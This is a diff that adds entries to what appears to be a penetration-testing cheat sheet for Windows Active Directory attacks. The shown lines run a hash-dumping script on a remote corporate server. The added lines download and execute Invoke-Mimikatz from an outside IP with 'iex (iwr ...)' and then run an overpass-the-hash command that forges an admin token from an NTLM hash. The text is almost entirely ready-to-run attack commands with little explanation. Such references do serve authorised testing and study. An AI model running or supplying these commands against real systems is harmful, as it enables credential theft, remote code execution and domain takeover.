@@ -194,3 +194,10 @@ Invoke-Privesc                                        #Performs all checks
 Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName xxxx.corporate.corp.local          #Execute whoami & hostname commands on the indicated server
 Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName xxxx.corporate.corp.local #Execute the script Git-PassHashes.ps1 on the indicated server
 ```
+
+- **Invoke-Mimikatz:**
+```
+iex (iwr http://xxx.xxx.xxx.xxx/Invoke-Mimikatz.ps1 -UseBasicParsing)                                           #Execute Invoke-Mimikatz from computer xxx.xxx.xxx.xxx
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:corporate.corp.local /ntlm:x /run:powershell.exe"' #"Over pass the hash" generate tokens from hashes
+```
+
